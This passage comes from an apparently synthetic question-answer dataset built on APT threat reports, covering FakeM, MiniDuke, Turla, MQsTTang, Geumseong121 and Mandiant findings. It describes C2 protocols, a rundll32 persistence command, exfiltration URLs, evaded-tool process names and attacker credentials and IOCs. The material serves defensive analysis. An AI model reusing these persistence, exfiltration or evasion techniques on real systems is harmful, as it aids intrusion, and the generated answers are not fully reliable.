\"image1.png\" contains an undated response from VPSNOC to the \"Tue, Jul 21, 2013\" Tranchulas notification. The undated VPSNOC response that Tranchulas received is nearly identical to the response that TCIRT and the Kansas-City-based service provider obtained on July 24th. Tranchulas does not include the date or time as to when they obtained a response from VPSNOC.\nThe TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way that they knew about the activity or had been previously contacted by either party. When considering all of the inconsistencies, order of events and studying, Gmail webmail layout, similarities of keywords, salutations and closings within the \"Tue, Jul 21, 2013\" Tranchulas notification and the respective VPSNOC response. The TCIRT grew increasingly suspicious of the exchanges with VPSNOC and subsequent exchanges with Tranchulas personnel.\nMedium Headline: Inconsistency #5: Similar Document Metadata Properties\nAnalysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations, Report.docx58 and Naxalites_Funded_by_Pakistan.docx59, both maintained the author properties of \"hp\". In reviewing the document metadata within the \"Response_ThreatConnect.docx\" that was sent from Mr. Zubair Khan on August 6, 2013, the TCIRT also identified that this document maintained the creator properties of \"hp.\" (Figure 10)\nWhile the author field of \"hp\" doesn't conclusively prove a relationship, it contributes to a body of circumstantial evidence which matches the document properties of the official Tranchulas response to the document properties that were also found within decoy documents that were bundled with BITTERBUG implants.\n58 https://www.virustotal.com/en/file/7e940115988d64fbf7cd3b0d86cd2440529f921790578a96acac4c027120e0c5/analysis/\n59 https://www.virustotal.com/en/file/f689d9990a23fbde3b8688b30ff606da66021803390d0a48d02fad93dc11fa15/analysis/\nAnswer this question: What discrepancies were noted in Tranchulas' direct notification to VPSNOC, and how do these inconsistencies suggest prior knowledge or insider information?",
    "output": "Tranchulas claimed that their research team was already aware of the incident before the publication of the report and that they contacted the hosting company of the server to seek an explanation. However, there were no public references identifying VPSNOC as the hosting company. The only ways for Tranchulas to identify VPSNOC were to have previous insider knowledge of the activity or to have been privately introduced by the Kansas-City-based service provider to their client VPSNOC. This discrepancy suggests that Tranchulas had prior knowledge or insider information about the infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Evolving FakeM: Variants\nSince being originally exposed in 2013, authors of FakeM have continuously made changes to the FakeM codebase, resulting in multiple variants. Before elaborating on the different variants of FakeM, there are many similarities that remain throughout the various iterations. The architecture has not changed during the evolution of FakeM, as a modular framework exists in each variant, as seen in Figure 8. The FakeM main module is responsible for launching embedded modules, such as a keylogger or for gathering sensitive files. The main module is also responsible for communicating with its C2 servers and handling commands issued by the C2 server.\nAll FakeM variants initiate communications with its C2 server and check the C2's response for a\ncommand. Also, all FakeM variants share a common command handler with the same capabilities, as seen in Table 2. The limited command set suggests that FakeM's functionality is obtained by additional assembly code provided by the C2 server with the 0x211 command. According to Trend Micro's initial analysis on FakeM, threat actors delivered and ran additional code that provided further capabilities to the Trojan, such as the ability to run shell commands, steal passwords, capture the screen and upload files.\nCommandDescription0x212Idle. Attempts to receive another command immediately instead of sleeping for 30 seconds.0x213Sets a flag to end the session with the C2. This will force the Trojan to reestablish a session with the C2.0x214Exit process.\nTable 2: Command handler within all variants of FakeM\nNow that we have covered the commonalities between FakeM variants, the following sections will dive into the specific variants of FakeM. Unit 42 categorizes the different variations of FakeM based on the method used to communicate with the C2 server, which has changed dramatically over the years.\nOriginal FakeM\nThe original variant of FakeM generates network beacons to its C2 server that begin with a 32\u00adbyte header that in most cases is meant to blend into network traffic generated by legitimate applications. Following this 32\u00adbyte header, the original variant of FakeM includes data encrypted using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation.\nThe original variant includes the FakeM discovered and published by Trend Micro in 2013, in which the authors of FakeM first attempted to evade detection of its C2 communications by pretending to be generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Figures 9 and 10 show FakeM attempting to resemble MSN or Yahoo! Messenger traffic, as the first 32\u00adbytes contain data that resemble legitimate traffic generated by these chat programs.\nIn addition to emulating chat programs, FakeM has also included HTML code within the 32\u00adbyte header. As you can see in Figure 11, the overall structure of the beacon did not change, rather the only differences is the data in the header contains HTML tags. The HTML data in the header led Unit 42 to a published by Malware.lu that suggested the MSN, Yahoo, and HTML versions of the original variant of FakeM all share a common server application that the threat actors use to build samples and control infected systems.\nIn October 2013, FireEye published a about a sample of FakeM that did not use fake messenger or HTML data in the first 32 bytes of the C2 traffic, but instead used four repeating bytes to fill this portion of the packet, as seen in Figure 12. Unit 42 tracks this under the original variant, as it uses the same algorithm to encrypt the data and otherwise shares a common structure to the MSN,\nYahoo, and HTML versions with the exception of the modification to the first 32 bytes.\nFakeM SSL\nWhile performing infrastructure analysis on FakeM original variants, we came across shared infrastructure with domains that hosted C2 servers for malware samples that did not match the known FakeM communication protocols. Palo Alto Networks WildFire had analyzed many samples associated with these related C2 domains, all of which communicated with the C2 server using secure sockets layer (SSL). To determine the malware family that was generating this traffic, Unit 42 analyzed these samples and found that the functional code was the same as the original FakeM variant.\nThis discovery indicates the authors of FakeM introduced new code to the Trojan in order to use SSL to communicate with its C2 server. The drastic change in C2 channel warranted a new variant name, and we dubbed it \"FakeM SSL\". During the analysis of these samples we did not find any operational\nC2 servers to complete a handshake to establish a SSL session. During the handshake, the FakeM SSL samples will tell the server it supports 36 different cipher suites even though the samples appear to only support one. Unit 42 believes the cipher suite within the FakeM SSL variants uses Diffie\u00adHellman for key exchange and the RC4 cipher to encrypt the C2 communications.\nFakeM Custom SSL\nIn July 2015, Scarlet Mimic delivered a spear\u00adphishing email to a branch of the Russian government with intentions of installing a payload that was undetected by any antivirus vendors on VirusTotal. The high profile target and the lack of antivirus detection prompted Unit 42 to perform an in\u00addepth analysis and found that it is yet another new variant of the FakeM Trojan. We also named this variant after it's communication protocol (FakeM Custom SSL.)\nThis new variant of FakeM shared the same functional code as its predecessors, but again the communications with the C2 dramatically differed from the other variants. Communications between this variant and the C2 server leverage what Unit 42 believes is modified SSL code, as the code is very similar to the FakeM SSL variant. The code appears to use Diffie\u00adHellman for key exchange and the RC4 algorithm like FakeM SSL; however, the initial packet sent to the C2 server did not contain a \"client hello\" message, which is required to initiate an SSL handshake. Instead, the initial packet sent data as seen in Figure 13.\nThis variant of FakeM skips the traditional SSL handshake, which involves an agreement on a cipher suite to use to encrypt communications. The FakeM code only supports one cipher suite, which makes the cipher suite agreement portion of the SSL handshake irrelevant. Instead, FakeM creates a session with its C2 server by exchanging keys. The lack of a valid handshake makes detection of this C2 stream difficult, as the packets sent between the Trojan and the C2 to establish this session contain random binary data. Network devices will also be unable to perform any SSL decryption due to the lack of detection and the inability to determine the cipher suite used to encrypt the data. Figure 14 below provides a visual depiction of the handshake procedure and the subsequent beacon and command messages.\nThe handshake starts with a key exchange, which the Trojan initiates by creating a 2048\u00adbyte buffer that it will store its key (128\u00adbytes, followed by null values as seen in Figure 13) and sending its key to the C2 server. The C2 will respond with its own key (also 128\u00adbytes, followed by null values) that the Trojan will store and use to encrypt future communications.\nOnce this key exchange is complete, the Trojan acknowledges the receipt of the server's key by sending another 2048\u00adbyte packet to the server. To build the acknowledgement packet, the Trojan creates a 2048\u00adbyte buffer filled with null values and copies the string \"ws32.dll\" to offset 8 and encrypts the buffer with the server's key.\nAfter sending the acknowledgement packet, the Trojan will gather local system information and include it in a beacon to the C2 server. Like the packets sent in the key exchange, the beacon sent by the Trojan to the C2 server is 2048\u00adbytes in length; however, the system information gathered by the Trojan is only 296 bytes followed by 1752 are null values to fill the 2048 byte buffer. The system information follows the 296\u00adbyte structure seen below:\n1 2\n3 4 5 6 7 8 9 struct beaconToC2 {\nDWORD static_value_130h;\nCHAR username[128];\nCHAR computername[128];\nDWORD static_value_70000h;\nDWORD os_codepage;\nDWORD campaign_code_1;\nDWORD campaign_code_2;\n};\nThe Trojan will encrypt this data using the key provided by the C2 and send it to the server. The Trojan will then wait for the C2 to respond, which it will decrypt and parse for FakeM commands. Unit 42 has been unable extract any plug\u00adins from C2 network traffic; however, several FakeM custom SSL samples contain embedded plug\u00adins that run without interaction with the C2 server. Also, Unit 42 was able to extract several modules from the original FakeM server application, as seen in Table 3. All of these modules are shellcode\u00adbased plug\u00adins that would work with the custom SSL variant of FakeM with little to no modification.\nRelated to FakeM Original: CallMe\nCallMe is a Trojan designed to run on the Apple OSX operating system. This Trojan was delivered in targeted attacks on Uyghur activists in 2013 and used infrastructure associated with FakeM.\nIn February 2013, on the CallMe Trojan and found that it is based on a tool called Tiny SHell, an OSX shell tool whose source code is available on the Internet. The Trojan uses AES to encrypt the communication channel its C2 server, which will provide one of three commands to carry out activities on the compromised system, as seen in Table 4.\nCommandDescription2Put a file on the system from the C2 server. File is saved to a specified filename in <HOME directory>/downloads/.3Create a reverse shell to interact with the compromised system.\nTable 4: Commands Available in the CallMe OSX Malware\nQ: How does the CallMe Trojan, related to FakeM Original, operate on the Apple OSX operating system, and what commands does it support?",
    "output": "The CallMe Trojan is designed to run on the Apple OSX operating system and was delivered in targeted attacks on Uyghur activists in 2013. It uses infrastructure associated with FakeM and is based on a tool called Tiny SHell, whose source code is available on the Internet. The Trojan uses AES to encrypt the communication channel with its C2 server. The C2 server can provide one of three commands to carry out activities on the compromised system: '2' to put a file on the system from the C2 server, and '3' to create a reverse shell to interact with the compromised system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMQsTTang: Mustang Panda's latest backdoor treads new ground with Qt and MQTT\nMarch 2, 2023\nESET researchers have analyzed MQsTTang, a new custom backdoor that we attribute to the Mustang Panda APT group. This backdoor is part of an ongoing campaign that we can trace back to early January 2023. Unlike most of the group's malware, MQsTTang doesn't seem to be based on existing families or publicly available projects.\nMustang Panda is known for its (<https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/>)customized Korplug variants (also dubbed PlugX) and elaborate loading chains. In a departure from the group's usual tactics, MQsTTang has only a single stage and doesn't use any obfuscation techniques.\n\nHow does the MQsTTang backdoor, attributed to the Mustang Panda APT group, differ from the group's typical malware tactics, and what implications might this have for cybersecurity experts?",
    "output": "The MQsTTang backdoor differs from Mustang Panda's typical malware tactics in several significant ways. Firstly, unlike the group's usual customized Korplug variants (also known as PlugX), MQsTTang is a new custom backdoor that does not appear to be based on existing malware families or publicly available projects. Secondly, while Mustang Panda is known for its elaborate loading chains and obfuscation techniques, MQsTTang has only a single stage and does not employ any obfuscation methods. These differences suggest that the group may be experimenting with new strategies to evade detection and analysis. For cybersecurity experts, this implies a need to stay vigilant and adapt their detection and response mechanisms to account for simpler yet potentially more stealthy threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the mechanism by which the MiniDuke malware connects to its command and control server, and how it ensures that it remains undetected during its operation.",
    "output": "The MiniDuke malware connects to its command and control server by interpreting and decoding tweets from Twitter accounts. Once connected, it sends information about the infected system and awaits a response in the form of an encrypted GIF file. Upon decryption, the malware extracts and runs the embedded payload, often an update. To remain undetected, the malware stops execution once it connects to a Twitter account and only runs briefly upon each system boot. The payloads are not persistent on disk and are presumed to be downloaded from a specific location whenever the system boots up.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Turla backdoor module detect and evade common network analysis tools? What are the implications of this evasion technique for cybersecurity professionals?",
    "output": "The Turla backdoor module detects and evades common network analysis tools by delaying its execution when it discovers running processes with specific filenames associated with these tools, such as tcpdump.exe, windump.exe, ethereal.exe, wireshark.exe, ettercap.exe, snoop.exe, and dsniff.exe. This evasion technique makes it harder for cybersecurity professionals to analyze the module's behavior using standard network monitoring tools. To counteract this, security experts need to employ more sophisticated methods, such as using stealthier monitoring techniques or analyzing the module in isolated environments where these tools are not detected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "North Korea-related news sites and web sites have been mainly targeted by the threat, and lasts for several months.\nThe following is a malicious object added to the infected website.\nThe hacking group exploited the latest Flash player vulnerabilities CVE-2015-5119 and CVE-2015-0313 in 2015, and Flash Player CVE-2015-5119 vulnerability leaked from the server hacking attack performed by Italian Hacking Team.\nThe group has used KakaoTalk Messenger to selectively target victims and carried out the attack exploiting the CVE-2018-4878 Flash Player Zero-day vulnerability since late 2017.\n- G:\\FlashDeveloping\\mstest\\src (CVE-2014-8439)\n- G:\\FlashDeveloping\\20148439\\src (CVE-2014-8439)\n- G:\\FlashDeveloping\\Main\\src\\ (CVE-2015-0313)\n- G:\\FlashDeveloping\\2015-3090\\src (CVE-2015-3090)\n- G:\\FlashDeveloping\\20153105\\src (CVE-2015-3105)\n- G:\\FlashDeveloping\\20155119\\src (CVE-2015-5119)\n- G:\\FlashDeveloping\\chrome_ie\\src (CVE-2015-5119)\nIn case that the additional malware downloaded by the Flash Player Vulnerability (SWF) fails to execute administrator privileges via User Account Control, a fake error message of hard disk pops up after about 5 minutes.\nIt manipulates as backup process and re-execute the malware with administrator privilege CMD command. Some Korean expressions observed were identical to the English computer expression (prose, program) used in North Korea.\nThe C2 communication method has evolved over the years. In the earliest days, America Online Instant Messenger (AIM) Oscar protocol was used for Command and Control.\nThe encrypted communication proceeds with the AIM Messenger's account and password, which is English characters typed on Korean keyboard. The initially used PDB path shows it is developed in the AOL folder.\n- fastcameron13 / powercooper00 / dPfWls&Rkapfns19 (\uc610\ucc10&\uae4c\uba54\ub8ec 19)\n- F:\\Program\\svr_install\\Release\\svr_install.pdb\n- F:\\Program\\Aol\\Release\\ServiceDll1.pdb\nWhen communicating with AIM Messenger, the attacker uses the login account and password, and sends the encrypted message to another account user after the connection is completed.\nWhen the device is infected, the encrypted messages such as computer information and additional commands will be transmitted, and various accounts have been used.\nAttackers mainly have the following accounts such as aol.com, hotmail.com, yahoo.com, india.com, inbox.com, gmail.com and zmail.ru and created and used the other variants.\n- allmothersorg11@hotmail.com\n- allmothersorg@hotmail.com\n- bluelove@india.com\n- cmostenda01@yahoo.com\nThe emails such as \"zum36084@gmail.com\", \"zum36084@zmail.ru\", daum14401@zmail.ru were generated and they were sent as a test in early 2016.\nInvestigations based on IoA (Indicators of Attack) reveal that an attacker has set up a 'zum36084@gmail.com' email to disguise as 'Google Account Team', and they have used Hangul from the beginning.\nEmails sent as a test Mar 03, 2016 attached the '0303_zmail.gif' file, which is the malicious file of EXE format that is encrypted by 2 steps such as XOR 0x69 key.\nThe decrypted malicious file is set to infect only a specific computer name, which includes Korean name and the name of a journalist from a specific press.\n- \ud558\uc9c0\ub098\n- WOOSEONG-PC\n- T-PC\nSome variants check the following accounts. For example, the name of 'SEIKO' computer is often identified in IOCs. In particular, when using the HWP document file vulnerability, it matches the account of the last writer, and has been identified in the infection logs of '175.45.178.133'.\n- \ud64d\ucc44\uc5f0[\ud558\uc728]\n- KIM[Administrator]\n- JAMIE[Jamie Kim]\n- DONGMIN[MinSk]\n- T-PC[T]\n- YONGJA-PC\n- USER\n- sec\n- CRACKER-PC\n- SEIKO\nThe following sites are bookmarked by the users as follows in the infection log of 'SEIKO' account.\n\nHow did the Geumseong121 group evolve its Command and Control (C2) communication methods over time, and what indicators of compromise (IoCs) were associated with these methods?",
    "output": "The Geumseong121 group evolved its C2 communication methods over time. Initially, they used the America Online Instant Messenger (AIM) Oscar protocol for Command and Control. The encrypted communication proceeded with AIM Messenger's account and password, which were English characters typed on a Korean keyboard. The initially used PDB path indicated development in the AOL folder. Over time, the group shifted to using various email accounts from different domains such as aol.com, hotmail.com, yahoo.com, india.com, inbox.com, gmail.com, and zmail.ru. Indicators of compromise (IoCs) included specific email addresses like 'allmothersorg11@hotmail.com', 'bluelove@india.com', and 'cmostenda01@yahoo.com'. Additionally, the group used accounts like 'zum36084@gmail.com' and 'zum36084@zmail.ru' to send test emails, which contained malicious files encrypted with a 2-step XOR 0x69 key. These files were designed to infect specific computers with names like '\ud558\uc9c0\ub098', 'WOOSEONG-PC', and 'T-PC'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Installation\nOnce MiniDuke receives control it checks that the host process is not rundll32.exe and whether the current directory is %TEMP%. If either of those conditions is met the malware assumes it is run for the first time and it proceeds with its installation onto the system. MiniDuke gathers information about the system and encrypts its configuration based on that information, a method also used by (<http://go.eset.com/us/resources/white-papers/osx_flashback.pdf>)OSX/Flashback (this process is called watermarking by Bitdefender). The end result is that it is impossible to retrieve the configuration of an encrypted payload if analyzing it on a different computer. The information collected on infection has not changed since the previous version and consists of the following values:\nvolume serial number (obtained from kernel32!GetVolumeInformationA)\nCPU information (obtained with the cpuidinstruction)\ncomputer name (obtained from kernel32!GetComputerNameA)\nOnce the encrypted version of the malware is created, it is written into a file in the %ALLUSERSPROFILE%\\Application Data directory. The name of the file is randomly picked from the following values (you can find this listing and those of the next screenshots on the (<http://www.virusradar.com/en/Win32_SandyEva.G/description>)VirusRadar description:\nThe filename extension is also picked randomly from the following list:\nTo persist on the infected system after reboots, the malware creates a hidden .LNK file in the \"Startup\" directory pointing to the modified main module. The name of the .LNK file is randomly drawn from the\nfollowing values:\nThe .LNKfile is created using a COM object with the IShellLinkA interface and contains the following command: \"C:\\Windows\\system32\\rundll32.exe %path_to_main_module%, export_function\" Which gives something like:\n\"C:\\Windows\\system32\\rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\data.cat, IlqUenn\".\nMedium Headline: Operation\nWhen the malware is loaded by rundll32.exe and the current directory isn't %TEMP%, the malware starts with gathering the same system information as described in the \"Installation\" section to decrypt configuration information. As with the previous version of MiniDuke, it checks for the presence of the following processes in the system:\nIf any of these are found in the system the configuration information will be decrypted incorrectly, i.e. the malware will run on the system without any communication to C&C servers. If the configuration data is decrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by which to reach C&C server. It looks for the tag \"X)))\" on the page (MiniDuke was searching for \"uri!\" in previous samples) and if the tag is found it decrypts a URL from the data that follows it. The Twitter account @FloydLSchwartz does exist but has only retweets and no strings with the special tag.\nAs the next step, MiniDuke gathers the following information from the infected systems:\ncomputer name and user domain name\ncountry code of the infected host IP address obtained from (<http://www.geoiptool.com/>)http://www.geoiptool.com\nOS version information\ndomain controller name, user name, groups a user account belongs to\na list of AV products installed onto the system\nInternet proxy configuration\nversion of MiniDuke\nThis information is then sent to the C&C server along with the request to download a payload. The final URL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>= <system_info> Those tokens are derived as follows:\nurl_start \u2013 the URL retrieved from the twitter account\nrnd_param \u2013 randomly generated of lower case alphabet characters parameter name in the query\nstring of the URL\nsystem_info \u2013 base64 encoded and encrypted system information\nAn example of such a URL is given below:\nThe payload is downloaded in the file named \"fdbywu\" using the urlmon!URLDownloadToFileA API:\nThe downloaded payload is a fake GIF8 file containing encrypted executable. The malware processes the downloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using RSA-2048, then decrypts it, stores in a file and finally executes it. The RSA-2048 public key to verify integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke.\nMedium Headline: TwitterJS component\nThe TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of code into it and redirecting the exported functions to this code. Here is how the export address table of the patched binary looks after modifications.\nThis file is then stored in an (<http://msdn.microsoft.com/en-us/library/windows/desktop/aa364404(v=vs.85).aspx>)Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE% folder. Finally this DLL is registered as the Open command when a drive is open, which has the effect of starting the bot every time the user opens a disk drive. Below you can find the content of the init.cmd script used by MiniDuke to install TwitterJS module onto the system.\nWhen loaded, TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the core logic of the module.\nPrior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of\ntwo separate obfuscations, we can see that the variables have different values. This is probably done to thwart security systems that scan at the entry points of the JScript engine.\nResult of first obfuscation\nResult of second obfuscation\nThe purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute. It first generates a Twitter user to search for; this search term changes every 7 days and is actually a match to the real account name, not the Twitter account name. The bot then visits the Twitter profiles returned by the search and looks for links that end with \".xhtml\". When one is found, it replaces \".xhtml\" with \".php\" and fetches that link. Information about the computer is embedded in the Accept HTTP header.\nThe first link on the retrieved page should contain base64 data; the name attribute of the link is used as a rolling XOR key to decrypt the JScript code. Finally, MiniDuke calculates a hash of the fetched script and compares it with a hardcoded hash in the TwitterJS script. If they match, the fetched script is executed by calling eval().\nMedium Headline: The tale of the broken SHA-1\nThe code hashing algorithm used by the component looks very much like SHA-1 but outputs different hashes (you can find the complete implementation in Appendix B. We decided to search for what was\nchanged in the algorithm; one of our working hypotheses was that the algorithm might have been altered to make collisions feasible. We couldn't find an obvious difference; all the constants and the steps of the algorithm were as expected. Then we noticed that for short messages only the second 32-bit word was different when compared to the original SHA-1.\nSHA1('test') : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3\nTwitterJS_SHA1('test') : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3\nBy examining how this 2nd word was generated we finally discovered that this was caused by a scope issue. As shown below the SHA-1 function used a variable named f: the function Z() is then called which also uses a variable named f without the var keyword, causing it to be treated as a global variable rather than local to the function. The end result is that the value of f is also changed in the SHA-1 function which affects the value of the 2nd word for that round and ultimately the whole hash for long messages.\nA likely explanation of how this problem came to be is that the variable names were changed to single letters using an automated tool prior to embedding it in the payload. The 2 f variables probably had different names in the original script which avoided the issue. So this leaves us with two takeaways: 1) The difference in the hashing algorithm was unintentional and 2) Always declare your local variables with the var keyword. ;-)\nMedium Headline: Twitter DGA accounts\nWe generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered. At the moment only one exists, @AA2ADcAOAA, which is the TwitterJS account that was generated between August 21st and 27th 2013. This account has no tweets. In an effort to discover potential victims, we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server. So far we have received connections via the TwitterJS accounts from four computers located in Belgium, France and the UK. We have contacted national CERTs to notify the affected parties. We detect the RTF exploit document as (<http://virusradar.com/en/Win32_Exploit.CVE-2014-1761/detail>)Win32/Exploit.CVE-2014-1761.D and the MiniDuke components as (<http://www.virusradar.com/en/Win32_SandyEva.G/description>)Win32/SandyEva.G.\n\nExplain how MiniDuke uses Twitter to find and communicate with its Command and Control (C&C) servers. What specific tags and methods are employed in this process?",
    "output": "A: MiniDuke uses Twitter to find and communicate with its C&C servers by searching for specific tags on Twitter pages. It looks for the tag 'X)))' on the Twitter page of @FloydLSchwartz. If the tag is found, it decrypts a URL from the data that follows the tag. This URL is then used to communicate with the C&C server. The malware sends system information to the C&C server along with a request to download a payload. The final URL used for communication includes a base64 encoded and encrypted string of system information. The payload is downloaded as a fake GIF8 file containing an encrypted executable, which is then verified, decrypted, and executed by the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ENDURING TRENDS in Security Fundamentals\nMandiant's strategic security services measure the maturity of an organization's cyber security program across critical security domains. The critical security domains used to gain unauthorized access to organizations are observed annually by Mandiant during our incident response investigations.\nCommon attacker TTPs were observed during incident response investigations and further correlated by FireEye Threat Intelligence to correspond to areas of weakness frequently seen by our strategic services. Six information security domains were observed repeatedly:\nIncident response Network, cloud and data center protection Host and endpoint protection\nWe also observed that while organizations are increasingly recognizing the importance of operationalizing cyber threat intelligence (CTI), there are weaknesses in implementation.\nThe following examples are based on engagements delivered in 2017, where we saw attackers exploit weaknesses in an organization's detection and prevention controls.\nVery Small Headline: Identity and Access Management\nWe have observed that many organizations do not have formalized threat and vulnerability management functions with the authority and necessary visibility into all network enclaves, assets and applications, and patches and configuration changes are not applied in a consistent and timely manner across the enterprise. Patch management and configuration infrastructure often only covers a portion of the assets the organizations' environments, leaving groups of assets to be independently managed, resulting in inconsistencies in patching and configuration hardening.\nThrough our incident response and cyber threat intelligence experience, we see attackers leveraging unpatched vulnerabilities. These observations reinforce our belief in the importance of having mature threat and vulnerability management practices. In one case, an unnamed threat actor exploited an unpatched Apache Struts framework vulnerability of an organization's externally facing application server. The attacker then installed distributed denial of service (DDoS) malware on the server to create a platform to target other organizations.\nAnother example we observed APT35 (The Newscaster Team) compromising at least three U.S.-based companies, and performing reconnaissance at two other U.S. organizations and one non-U.S. company. At least one organization was likely compromised due to the attacker exploiting unpatched vulnerabilities in the Ektron CMS platform, which allowed them to upload web shell backdoors. The attacker then leveraged publicly available malware and legitimate Windows tools to dump passwords and exfiltrate data.\nWe continue to observe that authentication and authorization controls are often not hardened against abuse from attackers. Two of the most common issues are a lack of multi-factor authentication (MFA) enforcement and securing privileged credentials. Many organizations do not have MFA implemented, or they have a true MFA solution that provides the second factor \"out-of-band\" and not generated within the user's device. Instead, they rely on device certificate-based authentication, which is easier to bypass.  Additionally, organizations have not hardened their Active Directory environments, such as by reducing the exposure of Windows credentials in memory, and they have not adequately secured privileged credentials from misuse.\nAn example of an attacker exploiting single-factor authentication is APT28 (Tsar Team) in their targeting of hotel Wi-Fi networks. The group has used noteworthy techniques, including sniffing passwords from the guest Wi-Fi network traffic, poisoning the NetBIOS Name Service, and spreading laterally using the ETERNALBLUE exploit. One incident involved a user being compromised after connecting to a public Wi-Fi network. Twelve hours after the victim initially connected to the publicly available Wi-Fi network, APT28 logged into the machine with stolen credentials. After successfully accessing the machine, the attacker deployed tools on the machine, spread laterally through the victim's network, and accessed the victim's OWA account.\nAnother example of an attacker leveraging weakness in authentication and authorization controls is APT10 (Menupass Team), which typically uses credential harvesters to acquire privileged credentials. We observed them executing tools such as Mimikatz and SysInternals ProcDump to harvest user credentials in multiple intrusions where FireEye responded. These were invoked using different methods, including local execution, DLL search-order hijacking, remote execution and output through PsExec/WMIExec, and automated collection through custom batch scripts.\nVery Small Headline: Incident Response\nMany organizations we work with do not have well-defined data classification policies and protection requirements for sensitive data types. Compounding this, these same organizations often do not know all of the types of data they possess and where they are located within the enterprise in structured and unstructured locations. This information is necessary to properly establish appropriate detection and protection technologies and processes in accordance with the data sensitivity level. The upcoming General Data Protection Regulation (GDPR) requirements emphasize the importance of appropriate data handling practices and protections more than ever, and provide the mechanism to penalize organizations that are not taking the proper actions to protect sensitive data.\nIn multiple cases, Mandiant observed attackers leveraging minimal controls of sensitive data within the victim's environment. Sensitive intellectual property and PII were not secured with additional controls such as network segmentation, MFA, encryption and restrictive Internet egress controls. In these cases, the organizations applied few minimum internal controls beyond basic single-factor user authentication to applications, code repositories and network shares. Once the attackers were on the internal network with the proper credentials, they completed their mission of accessing the targeted information, staging the data and exfiltrating gigabytes of sensitive information.\nWe continue to see organizations struggle with consolidated visibility across all enclaves of their environments. Many organizations focus their monitoring on regulated portions of their networks (e.g., PCI, SOX) and have not expanded logging and monitoring efforts to other less-scrutinized portions. Incomplete and decentralized logging of investigation-relevant sources hinder the detection and response capabilities of the organization's information security team.\nIn many Mandiant incident response engagements, we observed that attacker activity went unmitigated by the organization's information security monitoring team and capability. This is due to many factors including lack of authority, lack of visibility and a lack of instrumentation. Mandiant often observes that information security is not a dedicated function and does not have authority across the organization, but only over a portion of assets. Specific key instrumentation components we see missing include a centralized log aggregation capability, host and endpoint logging configurations (e.g., PowerShell, Sysmon, OS and Application Audit logs) and network level visibility for lateral movement.\nVery Small Headline: Network, Cloud, and Data Center Protection\nWe commonly find deficiencies in network segmentation and secure configuration of cloud services. When customers do not have network segmentation properly implemented, detection and remediation are much more difficult, and the resulting impact of the breach is significantly higher. Neglecting to secure cloud services, such as the Office 365 email platform, results in attackers gaining access to sensitive emails and data and a limited ability for organizations to detect and investigate a breach.\nMandiant observed multiple cases of attackers targeting an organization's Office 365 instances to gain access to sensitive messages. Examples of techniques observed include malicious mailbox forwarding rules and abuse of the Office 365 eDiscovery functionality. We have seen attackers create the malicious mailbox forwarding rules by doing the following:\nVery\n\nBased on the above text, answer a question. What are the common deficiencies in network segmentation and secure configuration of cloud services that Mandiant observed, and how do these deficiencies impact an organization's ability to detect and remediate breaches?",
    "output": "Common deficiencies in network segmentation and secure configuration of cloud services include improper implementation of network segmentation and neglecting to secure cloud services like the Office 365 email platform. When network segmentation is not properly implemented, detection and remediation become much more difficult, and the impact of the breach is significantly higher. Neglecting to secure cloud services results in attackers gaining access to sensitive emails and data, with a limited ability for organizations to detect and investigate a breach. Mandiant observed multiple cases of attackers targeting an organization's Office 365 instances to gain access to sensitive messages, using techniques such as malicious mailbox forwarding rules and abuse of the Office 365 eDiscovery functionality.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 1 Introduction\nCivil society organizations (CSOs), working on human rights issues around the globe, face a spectrum of politically-motivated information security threats that seek to deny (e.g. Internet filtering, denial-of-service attacks), manipulate (e.g. website defacements) or monitor (e.g. targeted malware) information related to their work. Targeted malware attacks in particular are an in-\ncreasing problem for CSOs. These attacks are not isolated incidents, but waves of attacks organized in campaigns that persistently attempt to compromise systems and gain access to networks over long periods of time while remaining undetected. These campaigns are custom designed for specific targets and are conducted by highly motivated attackers. The objective of these campaigns is to extract information from compromised systems and monitor user activity and is best understood as a form of espionage. CSOs can be particularly susceptible to these threats due to limited resources and lack of security awareness. Targeted malware is an active research area, particularly in private industry. However, focused studies on targeted attacks against CSOs are relatively limited despite the persistent threats they face and the vulnerability of these groups.\nIn this study, we work with 10 CSOs for a period of 4 years to characterize and track targeted malware campaigns against these groups. With the exception of two groups that work on human rights in multiple countries, the remaining eight groups focus on China and Tibet-related human rights issues. We focus on targeted malware typically delivered via e-mail that is specifically tailored to these groups as opposed to conventional spam which has been well characterized in numerous previous works [27, 42,45, 52, 70, 71]. We consider the threats to these groups along two axes: the technical sophistication of the malware as well as sophistication of the social engineering used to deliver the malicious payload. We combine these two metrics to form an overall threat ranking that we call the Targeted Threat Index (TTI). While other scoring systems exist for characterizing the level of severity and danger of a 